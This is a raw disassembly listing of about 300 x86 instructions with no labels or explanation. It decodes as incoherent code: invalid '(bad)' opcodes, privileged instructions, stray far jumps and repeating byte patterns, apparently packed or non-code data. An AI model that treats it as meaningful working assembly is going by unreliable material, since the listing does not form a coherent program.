  402dc4:	fs ins DWORD PTR es:[edi],dx
  402dc6:	dec    edx
  402dc7:	aam    0x89
  402dc9:	jp     0x402df5
  402dcb:	push   esi
  402dcc:	and    al,BYTE PTR [eax]
  402dce:	pop    edx
  402dcf:	mov    eax,ds:0x884fd18f
  402dd4:	jbe    0x402d5b
  402dd6:	pop    ebx
  402dd7:	mov    ch,0x4a
  402dd9:	sbb    ah,BYTE PTR [esi-0x7cf1b583]
  402ddf:	pop    edi
  402de0:	cld    
  402de1:	sub    ch,BYTE PTR ss:[esi+0x26]
  402de5:	aad    0xb
  402de7:	mov    esp,0x2bab7a89
  402dec:	and    eax,0xd0940c7a
  402df1:	sub    ch,BYTE PTR [edx]
  402df3:	rol    DWORD PTR [ebp-0x76134cdf],cl
  402df9:	jp     0x402da2
  402dfb:	arpl   di,di
  402dfd:	sar    DWORD PTR [edi-0xc],0x2
  402e01:	sub    BYTE PTR [eax],0x27
  402e04:	retf   
  402e05:	sbb    DWORD PTR [ebx-0x2c],0x33041e89
  402e0c:	jbe    0x402d93
  402e0e:	pop    ebx
  402e0f:	pop    edi
  402e10:	stc    
  402e11:	push   esi
  402e12:	hlt    
  402e13:	inc    ebx
  402e14:	jbe    0x402d9b
  402e16:	push   edi
  402e17:	aam    0xda
  402e19:	test   eax,esi
  402e1b:	imul   edi,ebx,0xffffff89
  402e1e:	jecxz  0x402e7b
  402e20:	mov    BYTE PTR [edx],ch
  402e22:	sub    ah,ah
  402e24:	std    
  402e25:	jge    0x402dd5
  402e27:	jno    0x402e16
  402e29:	fstp   TBYTE PTR [edi-0x357a89d5]
  402e2f:	xchg   esp,eax
  402e30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e31:	sbb    esp,DWORD PTR [edx+0x4b]
  402e34:	imul   DWORD PTR [ecx+0x7b]
  402e37:	(bad)  
  402e38:	mov    DWORD PTR [edx-0x31],edi
  402e3b:	pcmpeqb mm0,QWORD PTR [ebp+0x107fe75b]
  402e42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e43:	inc    ecx
  402e44:	jle    0x402ec0
  402e46:	or     al,0xc8
  402e48:	add    ah,BYTE PTR [edx-0x2f76870d]
  402e4e:	outs   dx,DWORD PTR ds:[esi]
  402e4f:	pop    edi
  402e50:	int    0x5e
  402e52:	mov    ebx,0xd6b93628
  402e57:	push   esp
  402e58:	dec    ecx
  402e59:	jp     0x402e02
  402e5b:	sub    esi,ebx
  402e5d:	inc    ebp
  402e5e:	das    
  402e5f:	aad    0xcf
  402e61:	cs repnz aam 0x23
  402e65:	mov    ebp,0x9ffc14dc
  402e6a:	repnz aam 0x23
  402e6d:	popf   
  402e6e:	fcom   DWORD PTR [eax]
  402e70:	lods   eax,DWORD PTR ds:[esi]
  402e71:	js     0x402e1a
  402e73:	sub    edi,edi
  402e75:	icebp  
  402e76:	jg     0x402e40
  402e78:	call   0x1a83f636
  402e7d:	jmp    0x92202dd
  402e82:	rol    DWORD PTR ds:0xa734ed12,cl
  402e88:	call   FWORD PTR [ecx]
  402e8a:	repz aam 0x23
  402e8d:	sbb    esp,0xf372fc14
  402e93:	aam    0x23
  402e95:	test   esp,ebx
  402e97:	adc    al,0xfd
  402e99:	aaa    
  402e9a:	int    0x2b
  402e9c:	push   ds
  402e9d:	in     al,dx
  402e9e:	xor    eax,0xc112efa0
  402ea3:	pop    esp
  402ea4:	push   es
  402ea5:	test   DWORD PTR [edi],0xaf2f7684
  402eab:	test   al,0xb2
  402ead:	mov    esi,edx
  402eaf:	and    al,0xd9
  402eb1:	cs int 0x6b
  402eb4:	sbb    al,0x82
  402eb6:	or     eax,0xff76dc2b
  402ebb:	jnp    0x402edf
  402ebd:	aad    0x31
  402ebf:	rcr    edi,cl
  402ec1:	xchg   edx,eax
  402ec2:	sub    DWORD PTR [ebx],0xe8d68576
  402ec8:	lods   eax,DWORD PTR ds:[esi]
  402ec9:	sti    
  402eca:	outs   dx,BYTE PTR ds:[esi]
  402ecb:	cmp    DWORD PTR [esi-0x7b],esi
  402ece:	pop    ebx
  402ecf:	mov    esi,0x8f52238e
  402ed4:	xor    DWORD PTR [esi],ecx
  402ed6:	popf   
  402ed7:	jg     0x402edd
  402ed9:	add    al,0x5c
  402edb:	fwait
  402edc:	push   ds
  402edd:	das    
  402ede:	add    edi,DWORD PTR [edi+0x39]
  402ee1:	mov    ecx,0x8923d40d
  402ee6:	add    edx,DWORD PTR [edi+0x4d]
  402ee9:	jbe    0x402eaf
  402eeb:	call   0x81cba91e
  402ef0:	popa   
  402ef1:	in     al,0xa7
  402ef3:	sub    esi,DWORD PTR [esi-0x28]
  402ef6:	aam    0x91
  402ef8:	stc    
  402ef9:	stc    
  402efa:	addr16 das 
  402efc:	inc    ecx
  402efe:	jg     0x402ec4
  402f00:	aam    0x7a
  402f02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f03:	sub    esi,DWORD PTR [esi-0x7b]
  402f06:	pop    ebx
  402f07:	aam    0xe1
  402f09:	jp     0x402eb2
  402f0b:	sub    esi,DWORD PTR [esi+0x46]
  402f0e:	cmp    eax,0x1d1c7fe7
  402f13:	data16 sub al,0xe3
  402f16:	hlt    
  402f17:	mov    dl,0xba
  402f19:	stos   BYTE PTR es:[edi],al
  402f1a:	shl    DWORD PTR [ebx],cl
  402f1c:	imul   DWORD PTR [ebx+0x59]
  402f1f:	les    ecx,FWORD PTR [ecx-0x439b586]
  402f25:	(bad)  [ebp+0x540f7650]
  402f2b:	mov    al,ds:0x6e3dbf00
  402f30:	fnstcw WORD PTR [edi]
  402f32:	sub    BYTE PTR [edi],bl
  402f34:	push   0xbab2f4e3
  402f39:	stos   BYTE PTR es:[edi],al
  402f3a:	ror    bl,1
  402f3c:	mov    ch,0xd4
  402f3e:	outs   dx,BYTE PTR ds:[esi]
  402f3f:	sbb    eax,0x536551c8
  402f44:	jb     0x402f37
  402f46:	pop    ecx
  402f47:	aas    
  402f48:	jle    0x402f93
  402f4a:	sub    BYTE PTR [si-0x5899],dh
  402f4f:	lea    ecx,[edx-0xf]
  402f52:	fadd   DWORD PTR [ebx+0x1c]
  402f55:	xor    DWORD PTR [ebx],0xa77a99d4
  402f5b:	jl     0x402f79
  402f5d:	test   DWORD PTR [edx-0x7e],ebx
  402f60:	cdq    
  402f61:	icebp  
  402f62:	push   edi
  402f63:	stos   BYTE PTR es:[edi],al
  402f64:	call   0x5bf1:0x89d45881
  402f6b:	inc    ebx
  402f6c:	jb     0x402ef2
  402f6e:	pop    ebx
  402f6f:	aam    0xde
  402f71:	sub    DWORD PTR [esi+0x5bef567d],esp
  402f77:	mov    esp,0x2ba77a09
  402f7c:	sbb    al,0x86
  402f7e:	xor    esp,edx
  402f80:	jecxz  0x402ffd
  402f82:	iret   
  402f83:	sub    esi,DWORD PTR [esi-0x7b]
  402f86:	fild   DWORD PTR [ebx-0x557cd08a]
  402f8c:	mov    dl,0x81
  402f8e:	pop    eax
  402f8f:	aam    0x89
  402f91:	mov    ecx,0x55897337
  402f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f97:	add    BYTE PTR [ebx],ch
  402f99:	sbb    ebp,DWORD PTR ds:0x14c87217
  402f9f:	ins    BYTE PTR es:[edi],dx
  402fa0:	es mov dh,0x78
  402fa3:	adc    bh,ch
  402fa5:	add    edi,DWORD PTR [ebx+0x58]
  402fa8:	rcr    DWORD PTR [eax],0x44
  402fab:	pop    ecx
  402fac:	scas   eax,DWORD PTR es:[edi]
  402fad:	sahf   
  402fae:	mov    ebx,0x3a165768
  402fb3:	test   edx,ebp
  402fb5:	push   ecx
  402fb6:	fwait
  402fb7:	test   eax,0xdb467fe6
  402fbd:	xchg   edx,eax
  402fbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fbf:	sbb    eax,0x47e1ff23
  402fc4:	in     al,dx
  402fc5:	lods   al,BYTE PTR ds:[esi]
  402fc6:	push   ebx
  402fc7:	push   edi
  402fc8:	sbb    ch,0x1c
  402fcb:	int    0x60
  402fcd:	test   BYTE PTR [ebx],bl
  402fcf:	enter  0xf188,0x1a
  402fd3:	arpl   WORD PTR [edx+eax*2+0x5cd56bd4],dx
  402fda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fdb:	mov    eax,0xd45b3249
  402fe0:	mov    DWORD PTR [edx-0x59],edi
  402fe3:	sub    esi,DWORD PTR [esi-0x7b]
  402fe6:	pop    ebx
  402fe7:	aam    0x89
  402fe9:	jp     0x402f92
  402feb:	sub    esi,DWORD PTR [esi-0x7b]
  402fee:	pop    ebx
  402fef:	aam    0x89
  402ff1:	jp     0x402f9a
  402ff3:	sub    esi,DWORD PTR [esi-0x7b]
  402ff6:	pop    ebx
  402ff7:	aam    0x89
  402ff9:	jp     0x402ff2
  402ffb:	lods   al,BYTE PTR ds:[esi]
  402ffc:	ja     0x402f83
  402ffe:	pop    ebx
  402fff:	push   es
  403000:	lea    edi,[edx-0x59]
  403003:	das    
  403004:	jbe    0x402f8b
  403006:	xchg   esi,eax
  403007:	jmp    0x1c01:0x86267845
  40300e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40300f:	fwait
  403010:	clc    
  403011:	mov    dh,0xb6
  403013:	fs into 
  403015:	lock inc sp
